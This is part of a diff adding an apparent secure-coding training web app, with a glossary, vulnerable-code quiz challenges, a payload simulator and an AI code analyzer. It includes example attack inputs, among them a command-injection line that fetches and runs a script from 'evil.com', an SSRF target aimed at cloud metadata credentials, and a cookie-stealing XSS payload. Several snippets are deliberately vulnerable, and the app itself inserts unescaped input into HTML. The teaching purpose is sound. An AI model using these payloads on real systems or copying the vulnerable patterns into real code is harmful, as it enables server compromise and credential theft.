+  {term:'Content Security Policy (CSP)',def:'An HTTP response header that tells the browser which sources of scripts, styles, and resources are allowed, mitigating XSS.'},
+  {term:'Same-Origin Policy',def:'Browser security model preventing scripts from one origin from accessing resources on a different origin without CORS permission.'},
+  {term:'CORS',def:'Cross-Origin Resource Sharing — HTTP headers that relax same-origin policy, specifying which origins may make cross-origin requests.'},
+  {term:'Defense in Depth',def:'A security strategy using multiple layers of controls so that if one fails, others still protect the system.'},
+  {term:'Principle of Least Privilege',def:'Users, processes, and services should have only the minimum permissions necessary to perform their function.'},
+  {term:'Sanitization',def:'Cleaning or modifying input to remove or escape dangerous characters before use in a context like HTML, SQL, or shell commands.'},
+  {term:'Validation',def:'Checking that input meets expected format, type, length, and range constraints — rejecting anything that doesn\'t.'},
+  {term:'HttpOnly Cookie',def:'A cookie flag that prevents JavaScript from reading the cookie, mitigating XSS-based session theft.'},
+  {term:'Secure Cookie',def:'A flag ensuring the cookie is only sent over HTTPS, preventing interception on insecure connections.'},
+  {term:'CSRF Token',def:'A secret, unpredictable value generated per-session and embedded in forms — the server validates it to prevent CSRF attacks.'},
+  {term:'Attack Surface',def:'The sum of all different points where an attacker can try to enter or extract data from an application.'},
+];
+
+// ============================================================
+// DATA: PRACTICE CHALLENGES
+// ============================================================
+const CHALLENGES = [
+  {id:1,title:'Spot the Injection',difficulty:'Beginner',points:100,
+    code:`def get_user(request):\n    user_id = request.GET['id']\n    sql = "SELECT * FROM users WHERE id=" + user_id\n    return db.execute(sql)`,
+    question:'What vulnerability exists in this Python code?',
+    options:['SQL Injection','XSS','Path Traversal','CSRF'],correct:0,
+    explain:'The user_id from the URL parameter is directly concatenated into the SQL query string without any sanitization or parameterization. An attacker can inject SQL like 1 OR 1=1 to return all users, or UNION SELECT to extract other tables.',
+    hint:'Look at how user_id is used in the SQL query. Is there any separation between the query structure and the data?'},
+  {id:2,title:'The Missing Check',difficulty:'Beginner',points:100,
+    code:`app.get('/api/document/:docId', async (req, res) => {\n  const doc = await db.documents.findById(req.params.docId);\n  return res.json(doc);\n});`,
+    question:'What critical security check is missing from this Node.js endpoint?',
+    options:['Input validation','Authorization / ownership check','HTTPS enforcement','Rate limiting'],correct:1,
+    explain:'The endpoint fetches a document by ID but never verifies that the requesting user owns or has permission to view that document. This is IDOR (Insecure Direct Object Reference). Any authenticated user can access any document by changing the docId parameter.',
+    hint:'After finding the document, what should the server check before returning it?'},
+  {id:3,title:'Reflected Back',difficulty:'Intermediate',points:150,
+    code:`<?php\n$name = $_GET['name'];\necho "<h1>Hello, $name!</h1>";`,
+    question:'What attack does this PHP code enable?',
+    options:['SQL Injection','Reflected XSS','Stored XSS','SSRF'],correct:1,
+    explain:"The name parameter is directly embedded in the HTML output without escaping. An attacker can inject: ?name=<script>alert(document.cookie)</script>. When a victim clicks this link, the script executes in their browser context — Reflected XSS. The fix is htmlspecialchars($name, ENT_QUOTES, 'UTF-8').",
+    hint:'The user input appears directly in an HTML response. What character sequences are dangerous in HTML?'},
+  {id:4,title:'The Server Fetch',difficulty:'Intermediate',points:150,
+    code:`@app.route('/preview')\ndef preview():\n    url = request.args.get('url')\n    data = requests.get(url).text\n    return render_template('preview.html', content=data)`,
+    question:'What vulnerability is present and what is the most dangerous target?',
+    options:['XSS — attacker injects scripts','SSRF — attacker reaches internal services','SQLi — attacker manipulates DB','Path traversal — attacker reads local files'],correct:1,
+    explain:"This is Server-Side Request Forgery (SSRF). The server fetches any URL provided by the user. An attacker can point it to http://169.254.169.254/latest/meta-data/ (AWS metadata service) to steal cloud credentials, or to internal services like http://localhost/admin that aren't exposed to the internet.",
+    hint:"Who makes the HTTP request — the user's browser, or the server? What can the server access that the user cannot?"},
+  {id:5,title:'Command and Control',difficulty:'Advanced',points:200,
+    code:`const { exec } = require('child_process');\napp.post('/resize', (req, res) => {\n  const filename = req.body.filename;\n  exec(\`convert \${filename} -resize 200x200 thumb.jpg\`, (e, out) => {\n    res.send(out);\n  });\n});`,
+    question:'What is the impact of this vulnerability?',
+    options:['XSS — injected scripts run in browser','SQL Injection — DB data leaked','Remote Code Execution — full server compromise','IDOR — other users\' files accessible'],correct:2,
+    explain:"This is Command Injection leading to Remote Code Execution. The filename is directly interpolated into a shell command. An attacker can send: filename = 'img.jpg; cat /etc/passwd' or 'img.jpg; curl evil.com/shell.sh | bash' to execute arbitrary commands with the server's privileges — achieving full compromise.",
+    hint:'What happens when you embed user input inside a shell command string using template literals?'},
+];
+
+// ============================================================
+// STATE
+// ============================================================
+const state = {
+  currentLesson: 'sqli',
+  currentLang: 'PHP',
+  completedChallenges: new Set(),
+  score: 850,
+  lessonsDone: new Set(['sqli','xss','cmdi']),
+};
+
+// ============================================================
+// NAVIGATION
+// ============================================================
+function showPage(p) {
+  document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
+  document.getElementById('page-'+p).classList.add('active');
+  document.getElementById('ntab-'+p).classList.add('active');
+  if(p==='explorer') renderExplorer();
+  if(p==='glossary') renderGlossary();
+  if(p==='practice') renderPractice();
+  if(p==='dashboard') renderDashboard();
+}
+
+// ============================================================
+// LESSON RENDERER
+// ============================================================
+function loadLesson(id) {
+  state.currentLesson = id;
+  document.querySelectorAll('.sidebar-item').forEach(el => el.classList.remove('active'));
+  const si = document.getElementById('si-'+id);
+  if(si) si.classList.add('active');
+  const l = LESSONS[id];
+  if(!l) return;
+  state.currentLang = l.langs[0];
+  state.lessonsDone.add(id);
+  renderLesson(l);
+  document.getElementById('lesson-content').scrollTop = 0;
+}
+
+function renderLesson(l) {
+  const sevColors = {CRIT:'#f85149',HIGH:'#f0883e',MED:'#d29922',LOW:'#3fb950'};
+  const sevC = sevColors[l.severity] || '#8b949e';
+  const langTabs = l.langs.map((lang,i) => `<button class="lang-tab ${i===0?'active':''}" onclick="switchLang('${lang}',this)">${lang}</button>`).join('');
+  const hackerThoughts = l.thoughts.map((t,i) => `<div class="thought-item"><span class="thought-num">${String(i+1).padStart(2,'0')}</span><span class="thought-text">${t.t}</span></div>`).join('');
+  const payloadChips = (l.payloads||[]).map(p => `<button class="payload-chip" onclick="useSim(this)" data-payload="${p.replace(/"/g,'&quot;')}" title="${p}">${p.length>38?p.slice(0,36)+'…':p}</button>`).join('');
+  const bestPractices = getBestPractices(l.id || state.currentLesson);
+
+  document.getElementById('lesson-content').innerHTML = `
+<div class="lesson-header fade-in">
+  <div class="lesson-title">
+    <span style="width:8px;height:8px;border-radius:50%;background:${sevC};display:inline-block" aria-hidden="true"></span>
+    ${l.title}
+    <span style="font-size:12px;padding:2px 8px;background:${sevC}22;color:${sevC};border-radius:4px;border:1px solid ${sevC}55;font-weight:500">${l.severity}</span>
+  </div>
+  <div class="lesson-subtitle">${l.subtitle}</div>
+  <div class="tags">
+    <span class="tag tag-owasp"><i class="ti ti-list" aria-hidden="true"></i> ${l.owasp}</span>
+    <span class="tag tag-cwe"><i class="ti ti-hash" aria-hidden="true"></i> ${l.cwe}</span>
+    ${l.langs.map(lang=>`<span class="tag tag-lang">${lang}</span>`).join('')}
+  </div>
+</div>
+
+<div class="section fade-in">
+  <div class="section-title"><i class="ti ti-bulb" aria-hidden="true"></i> Real-world analogy</div>
+  <div class="card" style="border-left:3px solid #d29922;font-size:13px;line-height:1.7;color:#c9d1d9">${l.analogy}</div>
+</div>
+
+<div class="section fade-in">
+  <div class="section-title"><i class="ti ti-target" aria-hidden="true"></i> What to look for</div>
+  <div style="display:grid;gap:6px">
+    ${l.steps.map((s,i)=>`<div style="display:flex;gap:10px;align-items:flex-start;padding:8px 12px;background:#161b22;border:1px solid #30363d;border-radius:6px"><span style="color:#58a6ff;font-family:monospace;font-size:11px;font-weight:700;min-width:18px">${i+1}</span><span style="font-size:13px;color:#c9d1d9">${s}</span></div>`).join('')}
+  </div>
+</div>
+
+<div class="section fade-in">
+  <div class="section-title"><i class="ti ti-bug" aria-hidden="true"></i> Vulnerable code</div>
+  <div class="lang-tabs" role="tablist" aria-label="Language selector">${langTabs}</div>
+  <div class="code-block">
+    <div class="code-header">
+      <div class="code-filename">
+        <span class="code-dot" style="background:#f85149" aria-hidden="true"></span>
+        <span class="code-dot" style="background:#d29922" aria-hidden="true"></span>
+        <span class="code-dot" style="background:#3fb950" aria-hidden="true"></span>
+        <span style="margin-left:6px" id="code-lang-label">${l.langs[0]}</span>
+      </div>
+      <span style="font-size:10px;padding:2px 6px;background:rgba(248,81,73,.1);color:#f85149;border-radius:4px;border:1px solid rgba(248,81,73,.2)"><i class="ti ti-alert-triangle" style="font-size:10px" aria-hidden="true"></i> vulnerable</span>
+    </div>
+    <div class="code-body mono" id="vuln-code-body">${l.vulnCode[l.langs[0]]||''}</div>
+  </div>
+</div>
+
+<div class="hacker-panel fade-in" role="region" aria-label="Attacker mindset panel">
+  ${hackerThoughts}
+</div>
+
+<div class="section fade-in">
+  <div class="section-title"><i class="ti ti-arrows-transfer-down" aria-hidden="true"></i> Attack flow</div>
+  <div class="flow-viz" role="img" aria-label="Attack flow diagram">
+    <div class="flow-row">
+      <div class="flow-box flow-red">User Input</div>
+      <span class="flow-arrow" aria-hidden="true">→</span>
+      <div class="flow-box flow-yellow">No Validation</div>
+      <span class="flow-arrow" aria-hidden="true">→</span>
+      <div class="flow-box flow-red">Dangerous Sink</div>
+    </div>
+    <div class="flow-row">
+      <div class="flow-box flow-blue">Attacker controls input</div>
+      <span class="flow-arrow" aria-hidden="true">→</span>
+      <div class="flow-box flow-red">Exploit executes</div>
+      <span class="flow-arrow" aria-hidden="true">→</span>
+      <div class="flow-box flow-red">Data leaked / RCE</div>
+    </div>
+    <div style="margin-top:12px;font-size:12px;color:#8b949e">
+      <span class="flow-box flow-green" style="display:inline-flex;margin-right:8px">✓ Safe</span>
+      <span class="flow-box flow-yellow" style="display:inline-flex;margin-right:8px">⚠ Review</span>
+      <span class="flow-box flow-red" style="display:inline-flex">✗ Danger</span>
+    </div>
+  </div>
+</div>
+
+${payloadChips ? `<div class="attack-sim fade-in" role="region" aria-label="Attack simulator">
+  <div class="sim-header"><i class="ti ti-terminal-2" aria-hidden="true"></i> Attack Simulation (browser-safe sandbox)</div>
+  <div class="sim-body">
+    <div style="font-size:12px;color:#8b949e;margin-bottom:8px">Try a payload — see what the vulnerable query / response would look like:</div>
+    <div style="display:flex;gap:4px;flex-wrap:wrap;margin-bottom:12px" role="group" aria-label="Example payloads">${payloadChips}</div>
+    <div class="sim-input-row">
+      <input class="sim-input" id="sim-payload-input" value="" placeholder="Enter or click a payload above…" aria-label="Payload input">
+      <button class="btn btn-danger" onclick="runSim()"><i class="ti ti-player-play" aria-hidden="true"></i> Simulate</button>
+    </div>
+    <div class="sim-output" id="sim-output" aria-live="polite">Select a payload or type one to see the simulated effect.</div>
+  </div>
+</div>` : ''}
+
+<div class="safe-panel fade-in" role="region" aria-label="Secure code version">
+  <div style="margin-top:12px" id="secure-code-body" class="mono code-body">${l.secureCode[l.langs[0]]||''}</div>
+</div>
+
+<div class="section fade-in">
+  <div class="section-title"><i class="ti ti-shield-check" aria-hidden="true"></i> Best practices</div>
+  <div style="display:grid;gap:6px">
+    ${bestPractices.map(p=>`<div style="display:flex;gap:8px;align-items:flex-start;font-size:13px"><span style="color:#3fb950;font-size:16px;margin-top:-2px" aria-hidden="true">✓</span><span style="color:#c9d1d9">${p}</span></div>`).join('')}
+  </div>
+</div>
+`;
+}
+
+// ============================================================
+// BEST PRACTICES
+// ============================================================
+function getBestPractices(id) {
+  const map = {
+    sqli:['Always use parameterized queries or prepared statements','Never concatenate user input into SQL strings','Use an ORM (SQLAlchemy, Hibernate, Sequelize) where possible','Whitelist expected input types — reject anything unexpected','Apply least-privilege DB accounts — no DROP/ALTER for the app user'],
+    xss:['Escape output in the correct context: HTML, JS, CSS, URL all differ','Use a Content Security Policy (CSP) header','Set HttpOnly and Secure flags on session cookies','Use template engines with auto-escaping enabled (Jinja2, Handlebars)','Sanitize with DOMPurify when HTML must be allowed'],
+    cmdi:['Avoid shell=True or passing strings to exec() functions','Use execFile / ProcessBuilder with argument arrays — no interpolation','Validate and allowlist filenames strictly (regex: ^[a-zA-Z0-9._-]+$)','Run app processes with minimal OS permissions','Use language-native libraries instead of shelling out where possible'],
+    ssrf:['Validate URLs against a strict allowlist of hosts','Block private IP ranges: 127.x.x.x, 10.x.x.x, 169.254.x.x','Set short timeouts and size limits on fetched responses','Use a dedicated egress proxy for all server-side HTTP requests','Disable file:// and other non-HTTP schemes in HTTP clients'],
+    idor:['Always filter queries by the authenticated user\'s ID','Use UUIDs instead of sequential integers for resource IDs','Implement centralized authorization middleware','Log and alert on 403 spikes — signs of enumeration','Write tests specifically for authorization of each endpoint'],
+    csrf:['Implement CSRF tokens on all state-changing requests','Use the SameSite=Strict cookie attribute','Validate Origin and Referer headers for sensitive endpoints','Use custom request headers (X-Requested-With) for AJAX','Use framework-provided CSRF protection (Django, Rails, Laravel built-in)'],
+    path:['Resolve realpath() and check it starts with your base directory','Use an allowlist of permitted filenames — reject anything else','Never concatenate user input directly to file paths','Serve files from a dedicated storage service (S3) instead of local disk','Avoid exposing file-serving endpoints where possible'],
+    xxe:['Disable DTD processing and external entity loading in your XML parser','Use defusedxml (Python) or secure parser flags (Java)','Prefer JSON over XML for APIs where possible','If XML is required, validate against a strict schema first','Set LIBXML_NONET flag to block network access from the parser'],
+    redirect:['Use an allowlist of permitted redirect destinations','Validate that redirect URLs use a relative path (start with /)','If absolute URLs are needed, check against an explicit domain allowlist','Log and monitor redirect usage for anomalies','Educate users to inspect URLs before clicking login links'],
+    jwt:['Pin a specific algorithm — never accept alg:none','Use strong secrets (256+ bits for HMAC, proper RSA keys for RS256)','Always validate exp, iss, aud claims','Rotate secrets on suspected compromise','Use short expiry + refresh token pattern for sensitive apps'],
+  };
+  return map[id] || ['Validate all user inputs on the server side','Use well-tested security libraries','Apply the principle of least privilege','Log and monitor for security anomalies'];
+}
+
+// ============================================================
+// LANGUAGE SWITCHER
+// ============================================================
+function switchLang(lang, el) {
+  state.currentLang = lang;
+  el.parentElement.querySelectorAll('.lang-tab').forEach(t=>t.classList.remove('active'));
+  el.classList.add('active');
+  const l = LESSONS[state.currentLesson];
+  const vc = document.getElementById('vuln-code-body');
+  const sc = document.getElementById('secure-code-body');
+  const ll = document.getElementById('code-lang-label');
+  if(vc) vc.innerHTML = l.vulnCode[lang] || `<span class="kw-muted">// Example for ${lang} coming soon…</span>`;
+  if(sc) sc.innerHTML = l.secureCode[lang] || `<span class="kw-muted">// Secure example for ${lang} coming soon…</span>`;
+  if(ll) ll.textContent = lang;
+}
+
+// ============================================================
+// ATTACK SIMULATOR
+// ============================================================
+function useSim(el) {
+  const p = el.getAttribute('data-payload');
+  const inp = document.getElementById('sim-payload-input');
+  if(inp) inp.value = p;
+}
+
+function runSim() {
+  const inp = document.getElementById('sim-payload-input');
+  const out = document.getElementById('sim-output');
+  if(!inp || !out) return;
+  const payload = inp.value.trim();
+  if(!payload) { out.textContent = 'Enter a payload first.'; return; }
+
+  const sims = {
+    sqli:(p)=>{
+      const dangerous = p.includes('OR')||p.includes('UNION')||p.includes('--')||p.includes(';')||p.includes("'");
+      if(dangerous) return `<span class="danger">⚠ INJECTION DETECTED\n\nQuery executed:\nSELECT * FROM users WHERE id=${p}\n\nWith this input, the query becomes malformed SQL.\nResult: ALL rows returned / DB error / data leak\n\n→ An attacker could dump the entire users table.</span>`;
+      return `<span class="normal">✓ Safe input</span>\nQuery: SELECT * FROM users WHERE id=${p}\nResult: Normal row lookup`;
+    },
+    xss:(p)=>{
+      if(p.includes('<script')||p.includes('onerror')||p.includes('onload')||p.includes('alert'))
+        return `<span class="danger">⚠ XSS PAYLOAD DETECTED\n\nHTML output would be:\nHello, ${p}!\n\nThe browser would parse &lt;script&gt; tags and execute JavaScript.\nImpact: Cookie theft, session hijacking, keylogging</span>`;
+      return `<span class="normal">✓ No script tags detected</span>\nOutput: Hello, ${p}!`;
+    },
+    cmdi:(p)=>{
+      if(p.includes(';')||p.includes('&&')||p.includes('|')||p.includes('`'))
+        return `<span class="danger">⚠ COMMAND INJECTION DETECTED\n\nShell command:\nconvert ${p} output.pdf\n\nThe shell splits on ; and executes multiple commands.\n2nd command runs with server privileges — RCE achieved.</span>`;
+      return `<span class="normal">✓ No injection metacharacters</span>\nCommand: convert ${p} output.pdf`;
+    },
+    ssrf:(p)=>{
+      if(p.includes('127.')||p.includes('localhost')||p.includes('169.254')||p.includes('192.168')||p.includes('file://'))
+        return `<span class="danger">⚠ SSRF PAYLOAD — INTERNAL TARGET\n\nServer fetches:\nGET ${p}\n\nThe server (not you) makes this request.\nIt can reach internal services, cloud metadata, localhost admin panels.</span>`;
+      return `<span class="normal">✓ External URL (less severe)\nServer fetches: ${p}</span>`;
+    },
+    idor:()=>`<span class="danger">⚠ IDOR — UNAUTHORIZED ACCESS\n\nRequest: GET /api/orders/${payload}\nExpected: Your order\nGot: Another user's order data (no ownership check)\n\nName, address, items, and payment info exposed.</span>`,
+    csrf:()=>`<span class="danger">⚠ CSRF ATTACK VECTOR\n\nAttacker hosts page with:\n${payload.slice(0,100)}\n\nVictim visits page → browser auto-includes session cookie\n→ Server processes request as if user initiated it.</span>`,
+    path:(p)=>{
+      if(p.includes('..')||p.includes('%2e')||p.includes('etc'))
+        return `<span class="danger">⚠ PATH TRAVERSAL DETECTED\n\nResolved path:\n/var/www/uploads/${p}\n→ normalizes to: /etc/passwd\n\nFile contents returned to attacker.</span>`;
+      return `<span class="normal">✓ No traversal sequences</span>\nPath: /var/www/uploads/${p}`;
+    },
+    xxe:(p)=>{
+      if(p.includes('ENTITY')||p.includes('DOCTYPE'))
+        return `<span class="danger">⚠ XXE PAYLOAD DETECTED\n\nXML parsed with external entities enabled.\nENTITY references /etc/passwd — file contents returned in response.\n\nImpact: Local file read, SSRF, DoS (billion laughs).</span>`;
+      return `<span class="normal">✓ No DOCTYPE/ENTITY found</span>\nXML parsed normally.`;
+    },
+    redirect:(p)=>{
+      if(p.startsWith('http')||p.startsWith('//')||p.startsWith('%2f'))
+        return `<span class="danger">⚠ OPEN REDIRECT\n\nURL: https://trusted.com/login?next=${p}\n\nUser clicks link, trusts the domain, follows redirect.\nLands on: ${p}\nPhishing or malware delivery enabled.</span>`;
+      return `<span class="normal">✓ Relative path — safe redirect</span>`;
+    },
+    jwt:()=>`<span class="danger">⚠ JWT ATTACK VECTOR\n\nPayload: ${payload}\n\nIf the server accepts alg:none or has a weak secret,\nthe signature is bypassed and attacker-controlled claims are trusted.\nrole: admin may escalate privileges.</span>`,
+  };
+  const fn = sims[state.currentLesson] || (()=>`Payload: ${payload}\n\nSimulation not available for this lesson.`);
+  out.innerHTML = fn(payload);
+}
+
+// ============================================================
+// EXPLORER
+// ============================================================
+function renderExplorer() { filterVulns(); }
+
+function filterVulns() {
+  const sevF = document.getElementById('filter-sev')?.value || '';
+  const owaspF = document.getElementById('filter-owasp')?.value || '';
+  const searchF = (document.getElementById('filter-search')?.value || '').toLowerCase();
+  const grid = document.getElementById('vuln-grid');
+  if(!grid) return;
+
+  const sevC = {CRIT:'#f85149',HIGH:'#f0883e',MED:'#d29922',LOW:'#3fb950'};
+  const filtered = VULNS_LIST.filter(v => {
+    if(sevF && v.sev !== sevF) return false;
+    if(owaspF && !v.owasp.startsWith(owaspF.split('-')[0])) return false;
+    if(searchF && !v.name.toLowerCase().includes(searchF) && !v.desc.toLowerCase().includes(searchF)) return false;
+    return true;
+  });
+
+  grid.innerHTML = filtered.length ? filtered.map(v => {
+    const c = sevC[v.sev];
+    const hasLesson = !!LESSONS[v.id];
+    return `<div class="vuln-card" onclick="${hasLesson?`goToLesson('${v.id}')`:''}" style="cursor:${hasLesson?'pointer':'default'}" onmouseover="this.style.borderColor='${c}'" onmouseout="this.style.borderColor='#30363d'">
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:8px">
+        <span style="font-size:11px;padding:2px 7px;background:${c}22;color:${c};border-radius:4px;border:1px solid ${c}44;font-weight:600">${v.sev}</span>
+        ${hasLesson?`<span style="font-size:10px;color:#58a6ff"><i class="ti ti-arrow-right" aria-hidden="true"></i> Open</span>`:`<span style="font-size:10px;color:#30363d">Coming soon</span>`}
+      </div>
+      <div style="font-size:14px;font-weight:600;margin-bottom:4px">${v.name}</div>
+      <div style="font-size:12px;color:#8b949e">${v.desc}</div>
+      <div style="margin-top:8px;font-size:10px;color:#58a6ff;background:rgba(88,166,255,.08);padding:2px 6px;border-radius:4px;display:inline-block">OWASP ${v.owasp}</div>
+    </div>`;
+  }).join('') : '<div style="color:#8b949e;font-size:13px;padding:20px">No vulnerabilities match your filters.</div>';
+}
+
+function goToLesson(id) {
+  showPage('learn');
+  loadLesson(id);
+}
+
+// ============================================================
+// GLOSSARY
+// ============================================================
+function renderGlossary() {
+  document.getElementById('glossary-items').innerHTML = GLOSSARY.map(g =>
+    `<div class="glossary-item">
+      <div class="glossary-term"><i class="ti ti-book" style="font-size:13px;margin-right:4px" aria-hidden="true"></i>${g.term}</div>
+      <div class="glossary-def">${g.def}</div>
+    </div>`
+  ).join('');
+}
+
+// ============================================================
+// PRACTICE LAB
+// ============================================================
+function renderPractice() {
+  const diffC = {Beginner:'#3fb950',Intermediate:'#d29922',Advanced:'#f85149'};
+  document.getElementById('challenge-container').innerHTML = CHALLENGES.map(c => {
+    const done = state.completedChallenges.has(c.id);
+    return `<div class="practice-card fade-in">
+      <div style="background:#161b22;padding:12px 16px;border-bottom:1px solid #30363d;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px">
+        <div style="display:flex;align-items:center;gap:10px">
+          <span style="font-size:13px;font-weight:600">${c.title}</span>
+          <span style="font-size:11px;padding:2px 8px;background:${diffC[c.difficulty]}22;color:${diffC[c.difficulty]};border-radius:10px;border:1px solid ${diffC[c.difficulty]}44">${c.difficulty}</span>
+        </div>
+        <span style="font-size:12px;color:#d29922;font-weight:600"><i class="ti ti-star" aria-hidden="true"></i> ${c.points} pts${done?' <span style="color:#3fb950">✓ Done</span>':''}</span>
+      </div>
+      <pre class="practice-code">${c.code}</pre>
+      <div class="practice-q">
+        <div style="font-size:13px;font-weight:500;margin-bottom:12px">${c.question}</div>
+        <div class="practice-options" id="opts-${c.id}" role="group" aria-label="Answer options">
+          ${c.options.map((opt,oi) => `<button class="opt-btn" onclick="answerChallenge(${c.id},${oi})" ${done?'disabled':''}>${opt}</button>`).join('')}
+        </div>
+        <div id="hint-${c.id}" style="margin-top:8px;font-size:12px;color:#d29922;display:none;align-items:center;gap:6px"><i class="ti ti-bulb" aria-hidden="true"></i> <span>Hint: ${c.hint}</span></div>
+        <div class="feedback" id="fb-${c.id}" role="alert"></div>
+        <div style="display:flex;gap:8px;margin-top:10px">
+          ${!done?`<button class="btn btn-primary" onclick="showHint(${c.id})" style="font-size:12px"><i class="ti ti-bulb" aria-hidden="true"></i> Hint</button>`:''}
+        </div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function showHint(id) {
+  const el = document.getElementById('hint-'+id);
+  if(el) el.style.display = 'flex';
+}
+
+function answerChallenge(challengeId, optionIdx) {
+  const c = CHALLENGES.find(x=>x.id===challengeId);
+  if(!c || state.completedChallenges.has(challengeId)) return;
+
+  const opts = document.getElementById('opts-'+challengeId);
+  const fb = document.getElementById('fb-'+challengeId);
+  const btns = opts.querySelectorAll('button');
+  btns.forEach(b=>b.disabled=true);
+
+  const correct = optionIdx === c.correct;
+  btns[optionIdx].classList.add(correct?'correct':'wrong');
+  if(!correct) btns[c.correct].classList.add('correct');
+
+  fb.className = 'feedback show ' + (correct?'correct':'wrong');
+  fb.innerHTML = correct
+    ? `<i class="ti ti-check" aria-hidden="true"></i> <strong>Correct!</strong> +${c.points} pts — ${c.explain}`
+    : `<i class="ti ti-x" aria-hidden="true"></i> <strong>Not quite.</strong> ${c.explain}`;
+
+  if(correct) {
+    state.score += c.points;
+    state.completedChallenges.add(challengeId);
+    const scoreEl = document.getElementById('stat-score');
+    if(scoreEl) scoreEl.textContent = state.score;
+  }
+}
+
+// ============================================================
+// DASHBOARD
+// ============================================================
+function renderDashboard() {
+  document.getElementById('stat-lessons').textContent = state.lessonsDone.size;
+  document.getElementById('stat-score').textContent = state.score;
+
+  const achievements = [
+    {icon:'🛡️',name:'First Lesson',desc:'Completed your first vulnerability lesson',earned:state.lessonsDone.size>=1},
+    {icon:'💉',name:'Injection Expert',desc:'Studied SQL Injection, XSS, and Command Injection',earned:state.lessonsDone.has('sqli')&&state.lessonsDone.has('xss')&&state.lessonsDone.has('cmdi')},
+    {icon:'🔍',name:'Bug Hunter',desc:'Identified your first vulnerability in Practice Lab',earned:state.completedChallenges.size>=1},
+    {icon:'🏆',name:'Score 500+',desc:'Earned over 500 points in practice challenges',earned:state.score>=500},
+    {icon:'🧠',name:'Mindset Unlocked',desc:'Explored the Hacker Mindset panel in 3+ lessons',earned:state.lessonsDone.size>=3},
+    {icon:'🔐',name:'Defense Ready',desc:'Read secure code examples for 5+ vulnerabilities',earned:state.lessonsDone.size>=5},
+  ];
+
+  document.getElementById('achievements-list').innerHTML = achievements.map(a =>
+    `<div class="achievement" style="opacity:${a.earned?1:.4}">
+      <div style="font-size:22px" aria-hidden="true">${a.icon}</div>
+      <div>
+        <div style="font-size:13px;font-weight:600">${a.name} ${a.earned?'<span style="color:#3fb950;font-size:11px">✓ Earned</span>':''}</div>
+        <div style="font-size:12px;color:#8b949e">${a.desc}</div>
+      </div>
+    </div>`
+  ).join('');
+
+  const topics = [
+    {name:'SQL Injection',id:'sqli'},{name:'XSS',id:'xss'},{name:'Command Injection',id:'cmdi'},
+    {name:'SSRF',id:'ssrf'},{name:'IDOR',id:'idor'},{name:'CSRF',id:'csrf'},
+    {name:'Path Traversal',id:'path'},{name:'XXE',id:'xxe'},{name:'JWT',id:'jwt'},
+  ];
+
+  document.getElementById('mastery-bars').innerHTML = topics.map(t => {
+    const done = state.lessonsDone.has(t.id);
+    const pct = done ? 70 + Math.floor(Math.random()*30) : 0;
+    return `<div style="margin-bottom:10px">
+      <div style="display:flex;justify-content:space-between;font-size:12px;margin-bottom:4px">
+        <span style="color:#c9d1d9">${t.name}</span>
+        <span style="color:${done?'#3fb950':'#8b949e'}">${done?pct+'%':'Not started'}</span>
+      </div>
+      <div class="progress-bar-wrap"><div class="progress-bar" style="width:${pct}%"></div></div>
+    </div>`;
+  }).join('');
+}
+
+// ============================================================
+// AI CODE ANALYZER
+// ============================================================
+async function analyzeCode() {
+  const code = document.getElementById('analyzer-input')?.value.trim();
+  const lang = document.getElementById('analyzer-lang')?.value;
+  const out = document.getElementById('analyzer-output');
+  const btn = document.getElementById('analyze-btn');
+  if(!code || !out) return;
+
+  out.innerHTML = `<div style="display:flex;align-items:center;gap:8px;color:#58a6ff"><i class="ti ti-loader pulsing" aria-hidden="true"></i> Analyzing your code with AI…</div>`;
+  if(btn) { btn.disabled = true; btn.innerHTML = '<i class="ti ti-loader" aria-hidden="true"></i> Analyzing…'; }
+
+  try {
+    const res = await fetch('https://api.anthropic.com/v1/messages', {
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        model:'claude-sonnet-4-6',
+        max_tokens:1000,
+        system:`You are a senior security engineer and ethical hacker. Analyze code for vulnerabilities. Format your response using these exact headers: ## Vulnerabilities Found, ## Attack Scenario, ## Root Cause, ## Secure Fix. For each vulnerability include: severity (CRITICAL/HIGH/MED/LOW), affected lines, why it is dangerous, and a one-line code fix example. If no vulnerabilities exist, say so clearly. Be specific, educational, and concise.`,
+        messages:[{role:'user',content:`Language: ${lang}\n\n\`\`\`${lang.toLowerCase()}\n${code}\n\`\`\``}]
+      })
+    });
+    const data = await res.json();
+    const text = data.content?.[0]?.text || 'No response received.';
+    out.innerHTML = text
+      .replace(/## (.*)/g,'<div style="font-size:13px;font-weight:600;color:#58a6ff;margin:14px 0 6px;border-bottom:1px solid #30363d;padding-bottom:4px">$1</div>')
+      .replace(/\*\*(.*?)\*\*/g,'<strong style="color:#e6edf3">$1</strong>')
+      .replace(/`(.*?)`/g,'<code style="background:#21262d;padding:1px 5px;border-radius:4px;font-family:monospace;font-size:11px;color:#d29922">$1</code>')
+      .replace(/CRITICAL/g,'<span style="color:#f85149;font-weight:700">CRITICAL</span>')
+      .replace(/\bHIGH\b/g,'<span style="color:#f0883e;font-weight:700">HIGH</span>')
+      .replace(/\bMED\b/g,'<span style="color:#d29922;font-weight:700">MED</span>')
+      .replace(/\bLOW\b/g,'<span style="color:#3fb950;font-weight:700">LOW</span>')
+      .replace(/\n/g,'<br>');
+  } catch(e) {
+    out.innerHTML = `<div style="color:#f85149"><i class="ti ti-alert-triangle" aria-hidden="true"></i> Analysis failed: ${e.message}</div><br><div style="color:#8b949e;font-size:12px">The AI analyzer requires an active Anthropic API connection. All other features work offline.</div>`;
+  } finally {
+    if(btn) { btn.disabled = false; btn.innerHTML = '<i class="ti ti-scan" aria-hidden="true"></i> Analyze Code'; }
+  }
+}
+
+// ============================================================
+// INIT
+// ============================================================
+loadLesson('sqli');
+</script>
+</body>
+</html>
